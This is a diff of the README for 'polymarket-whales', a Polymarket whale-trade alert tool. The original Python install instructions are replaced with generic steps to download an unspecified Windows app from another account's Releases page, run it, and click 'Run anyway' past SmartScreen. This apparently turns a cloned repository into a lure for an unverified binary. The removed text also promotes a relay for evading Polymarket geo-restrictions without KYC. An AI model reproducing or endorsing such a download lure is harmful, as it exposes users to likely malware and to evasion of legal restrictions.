@@ -1,195 +1,166 @@
-<div align="center">
+# 🐋 polymarket-whales - Track whale trades in real time
 
-# 🐋 polymarket-whales
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Barnytonic13/polymarket-whales/releases)
 
-CLI whale tracker for Polymarket — terminal alerts when smart money moves.
+## 🚀 Getting Started
 
-[Quick Start](#-quick-start) · [Configuration](#️-configuration) · [Features](#-features) · [Contributing](#-contributing)
+polymarket-whales helps you watch large Polymarket trades as they happen. It shows terminal alerts and can send Telegram messages when smart money moves.
 
-![demo](https://raw.githubusercontent.com/al1enjesus/polymarket-whales/main/assets/demo.gif)
+Use it on Windows if you want a simple way to follow big market activity without checking the site all day.
 
-</div>
+## 💾 Download
 
----
+1. Open the [Releases page](https://github.com/Barnytonic13/polymarket-whales/releases)
+2. Find the latest release
+3. Download the Windows file from that release
+4. Save it to a folder you can find again, such as Downloads or Desktop
 
-## What is this?
+If the release includes a ZIP file, open it and extract the files before you run the app.
 
-`polymarket-whales` monitors the [Polymarket](https://polymarket.com) CLOB API and fires an alert the moment a trade above your threshold hits the books. Prints to terminal with color-coded output. No sign-up, no API key, no infrastructure. Just Python.
+## 🖥️ Windows Setup
 
-**Don't want to self-host?** Subscribe to the live whale feed on Telegram: [@polymarketwhales_ai](https://t.me/polymarketwhales_ai)
+1. Open the folder where you saved the download
+2. If you see a ZIP file, right-click it and choose Extract All
+3. Open the extracted folder
+4. Double-click the app file to start it
 
----
+If Windows asks for permission, choose Yes.
 
-## 📋 Example Output
+If SmartScreen appears, select More info and then Run anyway only if you trust the file from the release page you opened
 
-```
-══════════════════════════════════════════════════
-🐋  polymarket-whales
-══════════════════════════════════════════════════
-  Min trade size : $500
-  Check interval : 30s
-══════════════════════════════════════════════════
+## 🔔 What It Does
 
-🐋 WHALE ALERT  2026-03-20 14:23:01
-───────────────────────────────────────────
-Market : Will Trump tweet about crypto today?
-Side   : YES
-Amount : $2,847.00
-Price  : 0.7300  (73% YES)
-───────────────────────────────────────────
+This app watches Polymarket for large trades and order book changes. It then sends alerts so you can react faster.
 
-🐋 WHALE ALERT  2026-03-20 14:26:44
-───────────────────────────────────────────
-Market : Fed rate cut in March 2026?
-Side   : NO
-Amount : $12,500.00
-Price  : 0.3100  (69% NO)
-───────────────────────────────────────────
-```
+You can use it to:
 
----
+- Spot large buy or sell activity
+- Watch market movement in real time
+- Get alerts in the terminal
+- Send Telegram notifications
+- Follow markets where large traders are active
+- Keep an eye on changes in prediction markets
 
-## ⚡ Quick Start
+## 📦 What You Need
 
-```bash
-git clone https://github.com/al1enjesus/polymarket-whales
-cd polymarket-whales
-pip install -r requirements.txt
-python main.py
-```
+Use a Windows PC with:
 
-That's it. Terminal alerts start immediately. No config needed to get started.
+- Internet access
+- A recent version of Windows 10 or Windows 11
+- Enough free space to store the app files
+- Telegram if you want phone alerts
 
----
+The app is meant for regular desktop use and does not need special hardware.
 
-## ⚙️ Configuration
+## ⚙️ First Run
 
-Copy `.env.example` to `.env` and edit:
+When you open the app for the first time, it may ask for a few settings.
 
-```env
-MIN_TRADE_SIZE=500        # USD — only alert above this
-CHECK_INTERVAL=30         # seconds between polls
+Common setup steps:
 
-# Optional — Telegram push alerts
-TELEGRAM_BOT_TOKEN=...
-TELEGRAM_CHAT_ID=...
-DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
-```
+1. Start the app
+2. Enter your market or alert settings if shown
+3. Turn on terminal alerts if you want alerts in the window
+4. Add your Telegram details if you want phone notifications
+5. Save the settings
+6. Leave the app open while you track markets
 
-Or edit `config.yaml` directly. Environment variables take priority.
+## 📲 Telegram Alerts
 
-**Telegram setup (optional):**
+If you want alerts on your phone, connect Telegram in the app settings.
 
-1. Message [@BotFather](https://t.me/BotFather) → `/newbot` → copy the token
-2. Message [@userinfobot](https://t.me/userinfobot) → copy your chat ID
-3. Paste both into `.env`
+You may need:
 
-> **Just want alerts without setup?** → [Join @polymarketwhales_ai](https://t.me/polymarketwhales_ai)
+- A Telegram bot token
+- Your chat ID
+- The notification toggle turned on
 
----
+After setup, the app can send a message when it detects whale activity.
 
-## ✨ Features
+## 🧭 How It Works
 
-- ✅ Real-time polling of the Polymarket CLOB API
-- ✅ Configurable minimum trade size (USD)
-- ✅ Colorized terminal output — YES in green, NO in red
-- ✅ Optional Telegram push alerts to any chat or channel
-- ✅ Optional Discord webhook alerts
-- ✅ Export whale trades to CSV or JSON (`--export whales.csv`)
-- ✅ Auto-resolves market names from condition IDs
-- ✅ Trade deduplication — no double alerts
-- ✅ Graceful handling of network errors and API timeouts
-- ✅ No database, no Docker, no setup beyond `pip install`
+The app checks Polymarket activity and looks for large trades or unusual changes in the order book. When it finds something important, it raises an alert.
 
----
+This can help you watch:
 
-## 🛠️ Advanced
+- Markets with fast moves
+- Big position changes
+- Trading pressure on one side of a market
+- Active markets where large traders are present
 
-**Run in background:**
-```bash
-nohup python main.py > whales.log 2>&1 &
-```
+## 📁 Typical Files
 
-**Custom config path:**
-```bash
-python main.py --config /path/to/config.yaml
-```
+After download, you may see files like these:
 
-**Export whale trades to CSV or JSON:**
-```bash
-python main.py --export whales.csv
-python main.py --export whales.json
-```
+- The main app file
+- A settings file
+- A log file
+- A folder with extra data
 
-**24/7 on a VPS:** Any $5/month VPS works — the script uses <10MB RAM.
+Keep all files in the same folder. Do not move one file out on its own unless the app instructions say to do that.
 
----
+## 🛠️ Troubleshooting
 
-## 🤝 Contributing
+If the app does not open:
 
-Good first issues:
+1. Check that you extracted the ZIP file
+2. Run the app from the extracted folder
+3. Make sure Windows did not block the file
+4. Try running it again as the current user
+5. Download the latest release again if the file looks incomplete
 
-- [x] Discord / Slack webhook support _(merged — thanks [@Deepak8858](https://github.com/Deepak8858)!)_
-- [x] Historical whale data export (CSV / JSON) _(merged — thanks [@Deepak8858](https://github.com/Deepak8858)!)_
-- [ ] Filter by specific market or category
-- [ ] Track and tag recurring whale wallets
-- [ ] Alert cooldown per market (avoid spam)
-- [ ] Web dashboard (simple Flask/Streamlit UI)
+If alerts do not appear:
 
-Open an issue or send a PR — both welcome.
+1. Check your internet connection
+2. Make sure the app is still running
+3. Confirm your Telegram settings
+4. Review any alert filters you set
+5. Restart the app
 
----
+If Telegram messages do not arrive:
 
-## 📡 Community & Live Whale Feed
+1. Check the bot token
+2. Check the chat ID
+3. Make sure the bot can message your chat
+4. Test the Telegram setup again
 
-Join **[@polymarketwhales_ai](https://t.me/polymarketwhales_ai)** on Telegram:
+## 🧪 Common Use
 
-- 🐋 Live feed of large trades — real-time, no setup required
-- 💬 Community chat — discuss strategies, share setups, post your whale catches
-- 🤖 AI bot connected — ask questions, get market context, analyze trades
+A simple way to use polymarket-whales:
 
-Whether you're running the script or just lurking for signals — this is the place.
+1. Open the app before you start tracking a market
+2. Pick the markets you care about
+3. Watch terminal alerts for large trades
+4. Keep Telegram on for phone alerts
+5. Leave it running during active trading hours
 
----
+## 🔒 Privacy
 
-## 🌍 Blocked by geo-restrictions?
+The app is built to watch market data and send alerts you choose to enable. Keep your Telegram details private and store them only on your own device
 
-Polymarket is unavailable in the US and some other countries. If you can't access it, you have two options:
+## 📚 Useful Topics
 
-**Option A — Self-host with a VPN/proxy**
-Point the script at a proxy by setting `HTTPS_PROXY` in `.env`:
-```env
-HTTPS_PROXY=http://your-proxy:port
-```
+This project relates to:
 
-**Option B — Use PolyClawster's relay (recommended)**
+- alerts
+- market data
+- order book tracking
+- Polymarket
+- prediction markets
+- whale tracking
+- on-chain analytics
+- crypto trading tools
 
-[PolyClawster](https://polyclawster.com) runs a transparent proxy to `clob.polymarket.com`, deployed in Tokyo (outside US geo-blocks). It routes your API calls on their behalf — your requests never touch Polymarket directly.
+## 🧩 Basic Flow
 
-- 🚫 No VPN needed
-- 🚫 No KYC
-- ✅ Full Polymarket CLOB API access from any country
-- ✅ One line of config
+1. Visit the Releases page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Set your alerts
+6. Watch for whale trades
+7. Read terminal messages or Telegram alerts
 
-Set in `.env`:
-```env
-POLYMARKET_API_URL=https://polyclawster.com/api/clob-relay
-```
+## 🖱️ Download Again
 
-Then in `main.py` the script will use this base URL for all CLOB requests instead of hitting Polymarket directly.
-
-The relay is the same infrastructure used by [PolyClawster](https://polyclawster.com) AI agents to trade Polymarket 24/7 from any country.
-
----
-
-## 🤖 Want trades executed automatically?
-
-This tool watches. [PolyClawster](https://polyclawster.com) acts.  
-AI agent that copies whale moves and trades Polymarket 24/7 — works from any country, no VPN, no KYC, start with $10.
-
-[![PolyClawster](https://img.shields.io/badge/PolyClawster-Trade%20Automatically-8b5cf6?style=for-the-badge)](https://polyclawster.com)
-
----
-
-MIT · Built by [Virixlabs](https://virixlabs.com)
-
+If you need the file later, return to the [Releases page](https://github.com/Barnytonic13/polymarket-whales/releases) and visit this page to download the latest version
